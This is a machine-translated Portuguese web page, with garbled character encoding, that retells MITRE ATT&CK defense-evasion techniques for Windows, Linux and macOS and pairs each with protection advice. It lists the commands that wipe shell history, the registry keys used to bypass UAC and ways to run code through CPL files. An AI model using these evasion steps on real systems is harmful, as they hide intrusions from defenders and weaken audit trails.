<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∑üèæ ü¶ï üìë Aprenda t√°ticas, t√©cnicas e conhecimentos comuns do advers√°rio (ATT @ CK). T√°ticas corporativas. Parte 5 üîô üëï üõåüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Evas√£o de Defesa 
 Links para todas as partes: 
 Parte 1. Obtendo Acesso Inicial (Acesso Inicial) 
 Parte 2. Execu√ß√£o 
 Parte 3. Fixa√ß√£o (Persist√™ncia...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Aprenda t√°ticas, t√©cnicas e conhecimentos comuns do advers√°rio (ATT @ CK). T√°ticas corporativas. Parte 5</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/432624/"><h1>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Evas√£o de Defesa</a> </h1><br>  <b>Links para todas as partes:</b> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1. Obtendo Acesso Inicial (Acesso Inicial)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2. Execu√ß√£o</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 3. Fixa√ß√£o (Persist√™ncia)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 4. Escalonamento de Privil√©gios</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 5. Evas√£o de Defesa</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 6. Obtendo credenciais (acesso a credenciais)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 7. Descoberta</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 8. Movimento Lateral</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 9. Coleta de Dados (Cole√ß√£o)</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 10 Exfiltra√ß√£o</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 11. Comando e Controle</a> <br><br>  A se√ß√£o "Ignorar prote√ß√£o" descreve t√©cnicas pelas quais um invasor pode ocultar atividades maliciosas e impedir sua detec√ß√£o por ferramentas de prote√ß√£o.  V√°rias varia√ß√µes de t√©cnicas de outras se√ß√µes da cadeia de ataque que ajudam a superar defesas espec√≠ficas e medidas preventivas tomadas pelo lado defensor est√£o inclu√≠das nas t√©cnicas de desvio de defesa.  Por sua vez, as t√©cnicas de desvio de defesa s√£o aplicadas em todas as fases de um ataque. <br><a name="habracut"></a><br>  <i>O autor n√£o √© respons√°vel pelas poss√≠veis consequ√™ncias da aplica√ß√£o das informa√ß√µes contidas no artigo e tamb√©m se desculpa por poss√≠veis imprecis√µes feitas em algumas formula√ß√µes e termos.</i>  <i>As informa√ß√µes publicadas s√£o uma recontagem gratuita do conte√∫do do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">MITRE ATT &amp; CK</a> .</i> <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Manipula√ß√£o de token de acesso</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador <br>  <i>Descri√ß√£o: os</i> invasores podem usar tokens de acesso para executar a√ß√µes em v√°rios contextos de seguran√ßa do usu√°rio ou do sistema, evitando assim a detec√ß√£o de atividades maliciosas.  Um advers√°rio pode usar as fun√ß√µes da API do Windows para copiar tokens de acesso de processos existentes (roubo de token), para isso ele deve estar no contexto de um usu√°rio privilegiado (por exemplo, um administrador).  O roubo de tokens de acesso √© comumente usado para elevar privil√©gios do n√≠vel do administrador para o n√≠vel do sistema.  Um advers√°rio tamb√©m pode usar um token de acesso √† conta para autentica√ß√£o em um sistema remoto, se essa conta tiver as permiss√µes necess√°rias no sistema remoto.  Existem tr√™s maneiras principais de abusar dos tokens de acesso. <br><br>  <b>Roubo e representa√ß√£o de tokens.</b> <br>  A representa√ß√£o de tokens √© a capacidade do sistema operacional de iniciar encadeamentos em um contexto de seguran√ßa que n√£o seja o contexto do processo ao qual esse encadeamento pertence.  Em outras palavras, a personifica√ß√£o de tokens permite que voc√™ execute qualquer a√ß√£o em nome de outro usu√°rio.  Um advers√°rio pode duplicar um token de acesso usando a fun√ß√£o <i>DuplicateTokenEX</i> e usar <i>ImpersonateLoggedOnUser</i> para chamar um thread no contexto de um usu√°rio conectado ou usar <i>SetThreadToken</i> para atribuir um token de acesso a um fluxo. <br><br>  <b>Crie um processo usando um token de acesso.</b> <br>  Um invasor pode criar um token de acesso usando a fun√ß√£o <i>DuplicateTokenEX</i> e us√°-lo com <i>CreateProcessWithTokenW</i> para criar um novo processo que √© executado no contexto do usu√°rio representado. <br><br>  <b>Obten√ß√£o e representa√ß√£o de tokens de acesso.</b> <br>  Um advers√°rio, com nome de usu√°rio e senha, pode criar uma sess√£o de logon usando a fun√ß√£o API <i>LogonUser</i> , que retornar√° uma c√≥pia do token de acesso √† sess√£o de uma nova sess√£o e, em seguida, usando a <i>fun√ß√£o SetThreadToken</i> , atribua o token recebido ao fluxo. <br>  <i>O Metasploit Meterpreter</i> e o <i>CobaltStrike</i> possuem ferramentas para manipular tokens de acesso para elevar privil√©gios. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> para fazer pleno uso das t√°ticas acima, um invasor deve ter direitos de administrador do sistema; portanto, n√£o esque√ßa de limitar os privil√©gios de usu√°rios comuns.  Qualquer usu√°rio pode enganar os tokens de acesso se tiver credenciais leg√≠timas.  Limite a capacidade de usu√°rios e grupos criar tokens de acesso: <br><br>  <i>GPO: Configura√ß√£o do computador&gt; [Diretivas]&gt; Configura√ß√µes do Windows&gt; Configura√ß√µes de seguran√ßa&gt; Diretivas locais&gt; Atribui√ß√£o de direitos do usu√°rio: Crie um objeto de token</i> . <br><br>  Tamb√©m determine quem pode substituir os tokens de processo dos servi√ßos locais ou de rede: <br>  <i>GPO: Configura√ß√£o do computador&gt; [Diretivas]&gt; Configura√ß√µes do Windows&gt; Configura√ß√µes de seguran√ßa&gt; Diretivas locais&gt; Atribui√ß√£o de direitos do usu√°rio: Substitua um token no n√≠vel do processo.</i> <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Criando trabalhos do BITS (trabalhos do BITS)</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador, Sistema <br>  <i>Descri√ß√£o:</i> O Servi√ßo de Transfer√™ncia Inteligente em Segundo Plano do Windows (BITS) √© um mecanismo para transferir arquivos de forma ass√≠ncrona por meio do COM (Component Object Model) usando baixa largura de banda.  O BITS √© geralmente usado por atualizadores, mensageiros instant√¢neos e outros aplicativos que preferem trabalhar em segundo plano sem interromper a opera√ß√£o de outros aplicativos de rede.  As tarefas de transfer√™ncia de arquivos s√£o representadas como tarefas do BITS que cont√™m uma fila de uma ou mais opera√ß√µes de arquivo.  A interface para criar e gerenciar tarefas do BITS est√° dispon√≠vel nas ferramentas PowerShell e BITSAdmin.  Os invasores podem usar o BITS para baixar, iniciar e limpar depois de executar c√≥digo malicioso.  As tarefas do BITS s√£o armazenadas de forma aut√¥noma no banco de dados do BITS, enquanto o sistema n√£o cria novos arquivos ou entradas de registro, geralmente o BITS √© permitido pelo firewall.  Com a ajuda das tarefas do BITS, voc√™ pode ganhar uma posi√ß√£o no sistema criando tarefas longas (por padr√£o, 90 dias) ou chamando um programa arbitr√°rio ap√≥s a conclus√£o de uma tarefa ou erro do BITS (inclusive ap√≥s a reinicializa√ß√£o do sistema operacional). <br><br>  <i>Recomenda√ß√µes de prote√ß√£o: O</i> BITS √© uma funcionalidade padr√£o do sistema operacional, cuja utiliza√ß√£o √© dif√≠cil de distinguir da atividade maliciosa; portanto, o vetor de prote√ß√£o deve ser direcionado para impedir o lan√ßamento de ferramentas maliciosas no in√≠cio da cadeia de ataques.  Desabilitar o BITS completamente pode interromper as atualiza√ß√µes leg√≠timas de software; no entanto, voc√™ pode restringir o acesso √† interface do BITS a usu√°rios e grupos de acesso espec√≠ficos e tamb√©m pode limitar o tempo de vida das tarefas do BITS, definidas alterando as seguintes chaves: <br><br><ul><li>  <i>HKEY_LOCAL_MACHINE \ Software \ Policies \ Microsoft \ Windows \ BITS \ JobInactivityTimeout;</i> </li><li>  <i>HKEY_LOCAL_MACHINE \ Software \ Pol√≠ticas \ Microsoft \ Windows \ BITS \ MaxDownloadTime</i> . </li></ul><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Empacotando dados bin√°rios (preenchimento bin√°rio)</a> </h3><br>  <i>Sistema:</i> Windows, Linux, macOS <br>  <i>Descri√ß√£o:</i> alguns recursos de seguran√ßa verificam arquivos pesquisando assinaturas est√°ticas.  Os oponentes podem adicionar dados a arquivos maliciosos, a fim de aumentar seu tamanho para um valor que exceda o tamanho m√°ximo permitido do arquivo digitalizado ou alterar o hash do arquivo, a fim de ignorar as listas de bloqueios de hash do lan√ßamento de arquivos por hashes. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> forne√ßa a identifica√ß√£o de software potencialmente perigoso aplicando ferramentas como <i>AppLocker</i> , ferramentas da lista de permiss√µes e pol√≠ticas de restri√ß√£o de software. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Ignorar controle de conta de usu√°rio</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador <br>  <i>Descri√ß√£o:</i> existem muitas maneiras de ignorar o UAC, sendo as mais comuns implementadas no projeto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">UACMe</a> .  Novas maneiras de ignorar o UAC s√£o descobertas regularmente, como abusar do aplicativo de sistema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">eventvwr.exe</a> , que pode executar um arquivo bin√°rio ou um script elevado.  Programas maliciosos tamb√©m podem ser incorporados em processos confi√°veis ‚Äã‚Äãpelos quais o UAC permite a escala√ß√£o de privil√©gios sem solicitar ao usu√°rio. <br><br>  Para ignorar o UAC usando eventvwr.exe, a chave √© modificada no registro do Windows: <br>  <i>Comando [HKEY_CURRENT_USER] \ Software \ Classes \ mscfile \ shell \ open \</i> . <br><br>  Para ignorar o UAC usando sdclt.exe, as chaves no registro do Windows s√£o modificadas: <br>  <i>[HKEY_CURRENT_USER] \ Software \ Microsoft \ Windows \ CurrentVersion \ App Paths \ control.exe;</i> <i><br></i>  <i>[HKEY_CURRENT_USER] \ Software \ Classes \ exefile \ shell \ runas \ command \ isolatedCommand.</i> <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> remova usu√°rios do grupo de administradores locais nos sistemas protegidos.  Se poss√≠vel, ative o n√≠vel mais alto de prote√ß√£o nas configura√ß√µes do UAC. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">CMSTP</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">(AppLocker ByPass - CMSTP)</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o:</i> o Instalador de Perfil do Microsoft Connection Manager (cmstp.exe) √© o utilit√°rio "Connection Manager Profile Installer" incorporado no Windows.  O cmstp.exe pode usar um arquivo inf como par√¢metro, para que um invasor possa preparar um INF mal-intencionado especial para baixar e executar DLLs ou scriptlets (* .sct) de servidores remotos, ignorando o AppLocker e outros bloqueios, pois o cmstp.exe √© assinado com um certificado digital da Microsoft. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Bloqueando o lan√ßamento de aplicativos potencialmente perigosos.  Monitorar ou bloquear completamente o <i>lan√ßamento de C: \ Windows \ System32 \ cmstp.exe</i> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Limpar hist√≥rico de comandos</a> </h3><br>  <i>Sistema:</i> Linux, macOS <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o:</i> para conveni√™ncia dos usu√°rios nos sistemas macOS e Linux, todos os comandos executados pelo usu√°rio no terminal s√£o registrados.  Os usu√°rios podem executar rapidamente um comando que eles executaram anteriormente em outra sess√£o.  Quando um usu√°rio faz logon no sistema, o hist√≥rico de comandos √© salvo no arquivo especificado na vari√°vel HISTFILE.  Quando o usu√°rio efetua logout, o hist√≥rico de comandos √© salvo no diret√≥rio inicial do usu√°rio ~ / .bash_history.  O arquivo de hist√≥rico de comandos tamb√©m pode conter senhas inseridas pelo usu√°rio em texto n√£o criptografado.  Os invasores podem procurar senhas nos arquivos do hist√≥rico de comandos e tomar medidas para impedir que suas atividades maliciosas sejam gravadas no hist√≥rico de comandos, por exemplo: <br><br>  <i>n√£o definido HISTFILE;</i> <i><br></i>  <i>exportar HISTFILESIZE = 0;</i> <i><br></i>  <i>hist√≥ria -c;</i> <i><br></i>  <i>rm ~ / .bash_history.</i> <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Impedir que os usu√°rios excluam ou gravem arquivos bash_history pode impedir que um advers√°rio abuse desses arquivos; al√©m disso, restringir os direitos do usu√°rio para editar as vari√°veis ‚Äã‚ÄãHISTFILE e HISTFILESIZE preservar√° o log de execu√ß√£o do comando. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Assinatura de c√≥digo</a> </h3><br>  <i>Sistema:</i> Windows, macOS <br>  <i>Descri√ß√£o: a</i> assinatura digital do c√≥digo fornece autentica√ß√£o do desenvolvedor e garante que o arquivo n√£o foi modificado.  No entanto, como voc√™ sabe, os oponentes podem usar assinaturas para disfar√ßar malware como arquivos bin√°rios leg√≠timos.  Os certificados de assinatura digital podem ser criados, adulterados ou roubados por um invasor.  A assinatura de c√≥digo para verifica√ß√£o de software na primeira inicializa√ß√£o √© usada no Windows, macOS, OS X e n√£o √© usada no Linux devido √† estrutura descentralizada da plataforma.  Os certificados de assinatura de c√≥digo podem ser usados ‚Äã‚Äãpara ignorar pol√≠ticas de seguran√ßa que exigem que apenas o c√≥digo assinado seja executado no sistema. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> O uso de "listas brancas" do software e a sele√ß√£o de editores confi√°veis ‚Äã‚Äãantes da verifica√ß√£o da assinatura digital podem impedir a execu√ß√£o de c√≥digos maliciosos ou n√£o confi√°veis ‚Äã‚Äãno sistema protegido. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Firmware de componentes</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Sistema <br>  <i>Descri√ß√£o:</i> alguns cibercriminosos podem usar ferramentas sofisticadas para comprometer os componentes do computador e instalar um firmware mal-intencionado que executar√° c√≥digo mal-intencionado fora do sistema operacional ou mesmo do firmware do sistema principal (Bios).  A t√©cnica consiste em piscar componentes do computador que n√£o possuem um sistema interno de verifica√ß√£o de integridade, por exemplo, discos r√≠gidos.  Um dispositivo com firmware malicioso pode fornecer acesso constante ao sistema atacado, apesar das falhas e da substitui√ß√£o do disco r√≠gido.  A t√©cnica foi projetada para superar a prote√ß√£o do software e o controle de integridade. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Intercepta√ß√£o de links e links COM (seq√ºestro de modelo de objeto de componente)</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o: O</i> Microsoft Component Object Model (COM) √© uma tecnologia para a cria√ß√£o de software com base nos componentes de intera√ß√£o de um objeto, cada um dos quais pode ser usado em muitos programas simultaneamente.  Os invasores podem usar o COM para injetar c√≥digo malicioso que pode ser executado em vez do leg√≠timo, capturando links e links COM.  Para interceptar um objeto COM, voc√™ precisa substituir o link para um componente leg√≠timo do sistema no registro do Windows.  Uma chamada adicional para este componente executar√° c√≥digo malicioso. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Medidas preventivas para evitar esse ataque n√£o s√£o recomendadas, pois os objetos COM fazem parte do sistema operacional e est√£o instalados no software do sistema.  O bloqueio de altera√ß√µes nos objetos COM pode afetar a estabilidade do sistema operacional e do software.  O vetor de prote√ß√£o √© recomendado para bloquear software malicioso e potencialmente perigoso. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Itens do painel de controle</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador, Sistema <br>  <i>Descri√ß√£o:</i> a t√°tica √© usar os elementos do Painel de Controle do Windows pelos invasores para executar comandos arbitr√°rios como carga (por exemplo, o v√≠rus <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Reaver</a></i> ).  Objetos mal-intencionados podem ser disfar√ßados como controles padr√£o e entregues ao sistema usando anexos de phishing.  Os utilit√°rios para visualizar e definir as configura√ß√µes do Windows s√£o arquivos exe e arquivos CPL registrados dos elementos do painel de controle do Windows.  Os arquivos CPL s√£o realmente DLLs renomeados que podem ser executados das seguintes maneiras: <br><br><ul><li>  diretamente da linha de comando: <i>control.exe &lt;file.cpl&gt;</i> ; </li><li>  usando as fun√ß√µes de API do shell32.dll: <i>rundll32.exe shell32.dll, Control_RunDLL &lt;file.cpl&gt;</i> ; </li><li>  clique duas vezes no arquivo cpl. </li></ul><br>  As CPLs registradas armazenadas no System32 s√£o exibidas automaticamente no Painel de Controle do Windows e t√™m um identificador exclusivo armazenado no registro: <br><br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ ControlPanel \ NameSpace</i> <br><br>  Informa√ß√µes sobre outras CPLs, por exemplo, o nome de exibi√ß√£o e o caminho para o arquivo cpl, s√£o armazenadas nas se√ß√µes <i>Cpls</i> e <i>Extended Properties</i> da se√ß√£o: <br><br>  <i>Painel HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Control</i> <br><br>  Algumas CPLs lan√ßadas atrav√©s do shell s√£o registradas na se√ß√£o: <br><br>  <i>Pasta HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Controls \ {nome} \ shellex \ PropertySheetHandlers</i> <br><br>  <i>Recomenda√ß√£o de prote√ß√£o:</i> restrinja o in√≠cio e o armazenamento de arquivos de itens do painel de controle apenas em pastas protegidas (por exemplo, <i>C: \ Windows \ System32</i> ), ative o UAC (User Account Control) e o AppLocker para impedir altera√ß√µes n√£o autorizadas no sistema.  Claro, o uso de software antiv√≠rus. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">DCShadow</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Administrador <br>  <i>Descri√ß√£o: o</i> <a href="http://">DCShadow</a> envolve a cria√ß√£o de um controlador de dom√≠nio falso na rede atacada, com a ajuda do qual, usando a funcionalidade da API para interagir com o CD atacado, um invasor pode modificar dados do AD, incluindo altera√ß√µes em qualquer objeto, credencial e chave do dom√≠nio, despercebidas pelos sistemas SIEM.  O kit de ferramentas para implementar o ataque faz parte da mimikatz.  O DCShadow pode ser usado para executar um ataque de inje√ß√£o do SID-History e criar backdoors para consolida√ß√£o adicional no sistema. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> como a t√©cnica DCShadow √© baseada no abuso dos recursos de design do AD, o vetor de prote√ß√£o deve ser direcionado para impedir o lan√ßamento de ferramentas de ataque.  Um ataque pode ser detectado analisando a replica√ß√£o em rede da replica√ß√£o de CD, que √© executada a cada 15 minutos, mas pode ser causada por um invasor fora do cronograma. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Intercepta√ß√£o de pesquisa de DLL (seq√ºestro de ordem de pesquisa de DLL)</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio, Administrador, Sistema <br>  <i>Descri√ß√£o: a</i> t√©cnica consiste em explorar vulnerabilidades no algoritmo para localizar pelos aplicativos os arquivos DLL que eles precisam para funcionar ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">MSA2269637</a> ).  Freq√ºentemente, o diret√≥rio de pesquisa DLL √© o diret√≥rio de trabalho do programa, portanto, os invasores podem substituir a DLL de origem por uma DLL maliciosa com o mesmo nome de arquivo. <br><br>  Ataques remotos em pesquisas de DLL podem ser executados quando o programa instala seu diret√≥rio atual em um diret√≥rio remoto, por exemplo, um compartilhamento de rede.  Al√©m disso, os invasores podem alterar diretamente o m√©todo de pesquisa e carregamento de DLLs, substituindo os arquivos .manifest ou .local, que descrevem os par√¢metros de pesquisa da DLL.  Se o programa atacado funcionar com um alto n√≠vel de privil√©gios, a DLL maliciosa carregada por ele tamb√©m ser√° executada com altos direitos.  Nesse caso, a t√©cnica pode ser usada para aumentar os privil√©gios do usu√°rio para o administrador ou sistema. <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Impe√ßa o carregamento remoto da DLL (ativado por padr√£o no Windows Server 2012+ e dispon√≠vel com atualiza√ß√µes para XP + e Server 2003+).  Ativa o modo de pesquisa segura para DLLs, que restringe os diret√≥rios de pesquisa a diret√≥rios como <i>% SYSTEMROOT%</i> antes de executar uma pesquisa DLL no diret√≥rio atual do aplicativo <br><br>  Habilitando o modo de pesquisa de DLL segura: <br>  <i>Configura√ß√£o do computador&gt; [Diretivas]&gt; Modelos administrativos&gt; MSS (herdado): MSS: (SafeDllSearchMode) Ative o modo de pesquisa de DLL segura.</i> <br>  Chave de registro correspondente: <br>  <i>HKLM \ SYSTEM \ CurrentControlSet \ Control \ Session Manager \ SafeDLLSearchMode.</i> <br><br>  Considere auditar um sistema protegido para corrigir defici√™ncias de DLL usando ferramentas como o PowerUP no PowerSploit.  N√£o se esque√ßa de bloquear software malicioso e potencialmente perigoso, al√©m de seguir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">as recomenda√ß√µes da Microsoft</a> . <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Carregamento lateral da DLL</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Descri√ß√£o: o</i> ataque √© baseado em vulnerabilidades da tecnologia de execu√ß√£o paralela lado a lado (WinSxS ou SxS), cuja ess√™ncia √© habilitar aplicativos que usam vers√µes incompat√≠veis dos mesmos componentes de c√≥digo.  O reposit√≥rio de montagem de componentes est√° localizado na pasta c: \ windows \ winsxs.  Cada assembly deve ter um manifesto associado a ele - um arquivo xml contendo informa√ß√µes sobre arquivos, classes, interfaces, bibliotecas e outros elementos do assembly.  Semelhante √†s t√©cnicas de seq√ºestrar uma pesquisa DLL, os advers√°rios podem provocar um aplicativo do usu√°rio a carregar "lateralmente" uma DLL mal-intencionada, cujo caminho foi especificado no arquivo de manifesto do assembly. <br><br>  <i>% TEMP% \ RarSFX% \% PERFIL DE USU√ÅRIOS% \ SXS;</i> <i><br></i>  <i>% TEMP% \ RarSFX% \% PERFIL DE USU√ÅRIOS% \ WinSxS.</i> <br><br>  <i>Recomenda√ß√µes de prote√ß√£o:</i> Atualiza√ß√µes regulares de software, instalando aplicativos em diret√≥rios protegidos contra grava√ß√£o.  Usando o sxstrace.exe para verificar os arquivos de manifesto quanto a vulnerabilidades de carregamento tardio. <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Desobstruir / decodificar arquivos ou informa√ß√µes</a> </h3><br>  <i>Sistema:</i> Windows <br>  <i>Direitos:</i> Usu√°rio <br>  <i>Descri√ß√£o: os</i> invasores podem usar ofusca√ß√£o de arquivos e informa√ß√µes para ocultar c√≥digos e artefatos maliciosos que sobraram de uma invas√£o.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para usar esses arquivos, os oponentes usam t√©cnicas reversas para desobstruir / decodificar arquivos ou informa√ß√µes. Tais m√©todos podem envolver o uso de malware, v√°rios scripts ou utilit√°rios do sistema, por exemplo, existe um m√©todo conhecido para usar o utilit√°rio certutil para decodificar o arquivo execut√°vel de uma ferramenta de acesso remoto oculta dentro de um arquivo de certificado. Outro exemplo √© o uso do comando copu / b para coletar fragmentos bin√°rios em uma carga maliciosa (Payload).</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os arquivos de carga √∫til podem ser compactados, arquivados ou criptografados para evitar a detec√ß√£o. </font><font style="vertical-align: inherit;">√Äs vezes, uma a√ß√£o do usu√°rio pode ser necess√°ria para executar desobstru√ß√£o ou descriptografia. </font><font style="vertical-align: inherit;">O usu√°rio pode precisar digitar uma senha para abrir um arquivo ou script compactado ou criptografado com conte√∫do malicioso. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> identifica√ß√£o e bloqueio de utilit√°rios de sistema desnecess√°rios ou software potencialmente perigoso que podem ser usados ‚Äã‚Äãpara desobstruir ou descriptografar arquivos usando ferramentas como AppLocker e pol√≠ticas de restri√ß√£o de software.</font></font><br><br><h3> <a 